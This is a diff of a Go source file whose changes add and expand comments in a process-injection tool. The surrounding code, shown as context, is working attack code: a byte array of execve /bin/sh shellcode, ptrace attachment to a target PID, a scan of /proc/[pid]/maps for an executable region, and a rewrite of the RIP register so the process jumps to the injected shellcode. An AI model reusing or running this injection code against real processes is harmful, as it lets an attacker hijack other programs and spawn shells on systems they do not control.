@@ -15,30 +15,30 @@ var shellcode = []byte{
 	0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0,
 	0x3b, 0x0f, 0x05,
 }
-
+// binsh shellcode
 func inject(pid int) {
 	var regs syscall.PtraceRegs
 
-	// Attach to the target process
+	// Attach to the target process using ptrace syscall. Ptrace attaches to the process specified in pid making it a tracee of the calling process. The tracee is sent a sigstop. 
 	if err := syscall.PtraceAttach(pid); err != nil {
 		fmt.Printf("Failed to attach to process: %v\n", err)
 		os.Exit(1)
 	}
 	defer syscall.PtraceDetach(pid)
 
-	// Wait for the process to stop
+	// Wait for the process to stop so we can manipulate it
 	if _, err := syscall.Wait4(pid, nil, 0, nil); err != nil {
 		fmt.Printf("Failed to wait for process: %v\n", err)
 		os.Exit(1)
 	}
 
-	// Get the current register state
+	// Get the current register state. Copy the tracees general purpose registers 
 	if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
 		fmt.Printf("Failed to get register state: %v\n", err)
 		os.Exit(1)
 	}
 
-	// Parse /proc/[pid]/maps to find an executable memory region
+	// Go through /proc/[pid]/maps to find an executable memory region
 	mapsPath := fmt.Sprintf("/proc/%d/maps", pid)
 	file, err := os.Open(mapsPath)
 	if err != nil {
@@ -46,7 +46,7 @@ func inject(pid int) {
 		os.Exit(1)
 	}
 	defer file.Close()
-
+	// saving the address of the rxp memory region
 	var address uintptr
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
@@ -83,7 +83,7 @@ func inject(pid int) {
 		}
 	}
 
-	// Modify the instruction pointer (RIP) to jump to the injected code
+	// Modify rip to jump to the injected code
 	regs.Rip = uint64(address)
 	if err := syscall.PtraceSetRegs(pid, &regs); err != nil {
 		fmt.Printf("Failed to set register state: %v\n", err)
